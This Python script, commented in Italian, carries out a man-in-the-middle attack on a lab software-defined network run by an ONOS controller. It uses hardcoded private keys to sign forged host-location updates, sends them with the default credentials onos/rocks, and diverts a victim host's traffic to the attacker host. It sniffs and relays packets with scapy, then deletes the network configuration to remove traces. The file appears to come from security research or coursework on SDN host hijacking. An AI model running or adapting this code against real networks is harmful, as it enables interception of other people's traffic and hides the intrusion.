#!/usr/bin/python3
import scapy.all as scapy
import requests
from requests.auth import HTTPBasicAuth
import argparse
import host_probing_hpke as hpke
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes
import json


"""-------------------- sezione variabili di utilità --------------------"""

# Tutte le chiavi private
hex_private_key_h1 = "3041020100301306072a8648ce3d020106082a8648ce3d03010704273025020101042047e1c26472993ae2f90ff88be6a2fc63036f83d34856ad7b53d0722bc0d78afe"
hex_private_key_h2 = "3041020100301306072a8648ce3d020106082a8648ce3d030107042730250201010420800a62931185d4c696f4f9626761969094f8debee8f3210f0f5d3d3e2312e252"
hex_private_key_h3 = "3041020100301306072a8648ce3d020106082a8648ce3d030107042730250201010420abc1c300e2db9096861a23855a60653f0ac2fbbee901cd4a14ec401914d0e086"
hex_private_key_h4 = "3041020100301306072a8648ce3d020106082a8648ce3d030107042730250201010420f5734089e61c5a061e25c1278bc3f7f7fd25655c2f0737a88917eb8162432e90"

# La chiave privata che dovrà utilizzare l'host malevolo per firmare le richieste
# (questa variabile sarà inizializzata a tempo di esecuzione)
chiave_privata = None

# Indirizzi IP degli host coinvolti nell'attacco
H1_IP = "10.0.0.1"
H3_IP = "10.0.0.3"
H1_MAC = "00:00:00:00:00:01"
H2_MAC = "00:00:00:00:00:02"
H3_MAC = "00:00:00:00:00:03"

# Credeziali per usare  le API REST di ONOS
ONOS_USER = "onos"
ONOS_PASS = "rocks"

#L'url del proxy (nat0) da usare per contattare il controller
url_proxy = "http://10.0.0.254:8080"

mac_ips = {"00:00:00:00:00:01": "10.0.0.1", "00:00:00:00:00:03": "10.0.0.3", "00:00:00:00:00:02": "10.0.0.2"}
locations = ["of:0000000000000001/1", "of:0000000000000002/3"]

# Interfaccia di rete su H2
INTERFACCIA = "h2-eth0"

packets_buffer = []

"""-------------------- fine sezione variabili di utilità --------------------"""

# Questo metodo assegna la chiave all'host che si sta utilizzando
def seleziona_chiave(host):
    global chiave_privata
    if host.strip() == 'h1':
        chiave_privata = hpke.converti_chiave_privata(hex_private_key_h1)
    if host.strip() == 'h2':
        chiave_privata = hpke.converti_chiave_privata(hex_private_key_h2)
    if host.strip() == 'h3':
        chiave_privata = hpke.converti_chiave_privata(hex_private_key_h3)
    if host.strip() == 'h4':
        chiave_privata = hpke.converti_chiave_privata(hex_private_key_h4)
    return chiave_privata

# Questo metodo crea un payload composto da un messaggio e la sua firma digitale
def aggiungi_firma(messaggio):
    firma = chiave_privata.sign(messaggio, ec.ECDSA(hashes.SHA256()))
    payload = firma + b"separatore" + messaggio
    return payload

# Sostituisce la location dell'host vittima con quella desiderata dall'attaccante
def scambia_location(mac):
    payload_hosts = {
        f"{mac}/None": {
            "basic": {
                "ips": [mac_ips[mac]],
                "locations": ["of:0000000000000002/2"]
            }
        }
    }

    payload = aggiungi_firma(json.dumps(payload_hosts).encode())

    # Invia la richiesta POST al controller ONOS
    response_hosts = requests.post(url_proxy, auth=HTTPBasicAuth(ONOS_USER, ONOS_PASS),
                                   headers={'Content-Type': 'application/json'}, data=payload)

    if response_hosts.status_code == 200:
        print(f"La location di {mac_ips[mac]} è stata modificata\n")

# Ripristina la location dell'host vittima, rimettendolo sulla porta dello switch originaria
def ripristina_location(mac):
    posizione_locations = list(mac_ips.keys()).index(mac)

    payload_hosts = {
        f"{mac}/None": {
            "basic": {
                "ips": [mac_ips[mac]],
                "locations": [locations[posizione_locations]]
            }
        }
    }
    payload = aggiungi_firma(json.dumps(payload_hosts).encode())
    response_hosts = requests.post(url_proxy, auth=HTTPBasicAuth(ONOS_USER, ONOS_PASS),
                                   headers={'Content-Type': 'application/json'}, data=payload)
    if response_hosts.status_code == 200:
        print(f"La location di {mac_ips[mac]} è stata ripristinata\n")

# Elimina ogni configurazione di rete aggiunta
def elimina_hosts():
    # Cancella Configurazioni di rete (Hosts, Links, Devices etc)
    payload = aggiungi_firma(b'delete')
    response_hosts = requests.delete(url_proxy, auth=HTTPBasicAuth(ONOS_USER, ONOS_PASS), data=payload)

    if response_hosts.status_code == 204:
        print(f"La topologia è stata ripristinata\n")


def packet_callback(packet):
    if packet not in packets_buffer:
        packets_buffer.append(packet)
        if ((packet[scapy.Ether].dst == H3_MAC and packet[scapy.Ether].src == H1_MAC) or
                (packet[scapy.Ether].dst == H1_MAC and packet[scapy.Ether].src == H3_MAC)):  # MAC di h3

            print(f"Pacchetto: {packet[scapy.IP].src} --> {packet[scapy.IP].dst} intercettato da 10.0.0.2\n")
            ripristina_location(packet[scapy.Ether].dst)  # Ripristina la porta originale del destinatario
            scambia_location(packet[scapy.Ether].src)
            scapy.sendp(packet, iface=INTERFACCIA, verbose=False)  # Invia i pacchetti tramite l'interfaccia di h2
            print(f"Pacchetto inoltrato ad {packet[scapy.IP].dst}\n\n{'-' * 75}\n")


def start_sniffing():
    scapy.sniff(iface=INTERFACCIA, prn=packet_callback, filter="ip")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", type=str, required=True, help="host su cui eseguire il probing")
    args = parser.parse_args()
    seleziona_chiave(args.host)
    # Inizia l'attacco modificando la posizione di H3
    scambia_location(H3_MAC)  # Modifica la porta di h3 a quella di h2
    # Mettiti in ascolto del traffico di rete
    start_sniffing()
    # Elimina le tracce prima di terminare il MITM
    ripristina_location(H1_MAC)
    ripristina_location(H3_MAC)
    elimina_hosts()
